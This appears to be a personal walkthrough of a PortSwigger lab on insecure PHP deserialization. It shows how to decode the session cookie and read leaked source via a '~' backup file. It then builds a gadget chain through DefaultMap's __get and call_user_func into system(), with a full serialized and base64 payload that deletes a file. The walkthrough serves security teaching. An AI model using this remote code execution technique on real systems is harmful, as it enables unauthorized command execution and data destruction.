# Developing a custom gadget chain for PHP deserialization

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization), you'll learn: Developing a custom gadget chain for PHP deserialization! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★★☆☆☆☆

## Background

This lab uses a serialization-based session mechanism. By deploying a custom gadget chain, you can exploit its [insecure deserialization](https://portswigger.net/web-security/deserialization) to achieve remote code execution. To solve the lab, delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-9/images/Pasted%20image%2020230112194055.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-9/images/Pasted%20image%2020230112194104.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-9/images/Pasted%20image%2020230112194117.png)

**When we successfully logged in, it'll set a new session cookie:**
```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ5andzbjF4emwwaWI4dTVhNTF5N3NlNTZ6cHN5bDdoNCI7fQ==
```

In the last character, it has a `=`, which is a padding for base64 encoding.

**Let's decode that:**
```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 19:44:10
╰─○ echo 'Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ5andzbjF4emwwaWI4dTVhNTF5N3NlNTZ6cHN5bDdoNCI7fQ==' | base64 -d
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"yjwsn1xzl0ib8u5a51y7se56zpsyl7h4";}
```

As you can see, it's a PHP serialized object.

**It has an object called `User`, and that object has 2 attributes: `username` = `wiener`, `access_token` = `yjwsn1xzl0ib8u5a51y7se56zpsyl7h4`.**

**View source page:**
```html
<!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated -->
```

In here, we see there is an `<a>` element, which points to `/cgi-bin/libs/CustomTemplate.php`.

**We can try to view the source code by appending a `~`:**
```php
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 19:47:08
╰─○ curl https://0a64000d04a336b3c12f18a7003a0098.web-security-academy.net/cgi-bin/libs/CustomTemplate.php\~
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```

In the class `CustomTemplate`, it has a `__wakeup()` magic method.

> `__wakeup()` magic method is invoked automatically **during** the deserialization process.

So, when the PHP deserialize our session cookie, it'll invoke method `build_product()`.

**Method `build_product()` will then create a new object `Product`, by referring the `default_desc_type` and `desc` attribute from class `CustomTemplate`.**

Also, class `DefaultMap` has a magic method called `__get()`. It'll be invoked when reading data from inaccessible (protected or private) or non-existing properties.

This magic method will then invoke method `call_user_func()`, which will execute any function that is passed into it via the `DefaultMap->callback` attribute. The function will be executed on the `$name`, which is the non-existent attribute that was requested.

Armed with above information, we can start to construct our custom gadget chains.

- **Goal: Invoke `system('rm /home/carlos/morale.txt')` via `__get` magic method in class `DefaultMap`.**

**PHP payload:**
```php
CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt";
CustomTemplate->desc = DefaultMap;
DefaultMap->callback = system
```

1. We can control class `CustomTemplate`'s attribute `default_desc_type` and `desc`, as magic method `__wakeup()` will be automatically invoked
2. Then we set the `CustomTemplate->desc` attribute's value to object `DefaultMap`. This will allow us to parse the `CustomTemplate->desc` attribute to `Product->desc`
3. After that, the `Product` constructor will find `DefaultMap->default_desc_type` attribute
4. Since object `DefaultMap` doesn't have `default_desc_type` attribute, it'll then invoke `__get()` magic method
5. Finally, that magic method will invoke `system` from `DefaultMap->callback` on the `default_desc_type`, which is set to our shell command

**serialized PHP object payload:**
```php
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:6:"system";}}
```

**Final payload:**
```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 20:50:46
╰─○ echo 'O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:6:"system";}}' | base64 -w0
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MTc6ImRlZmF1bHRfZGVzY190eXBlIjtzOjI2OiJybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7czo0OiJkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjg6ImNhbGxiYWNrIjtzOjY6InN5c3RlbSI7fX0K
```

**Let's copy and paste that base64 encoded payload to our session cookie:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-9/images/Pasted%20image%2020230112205224.png)

**Finally, refresh the page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-9/images/Pasted%20image%2020230112205235.png)

Nice!

# What we've learned:

1. Developing a custom gadget chain for PHP deserialization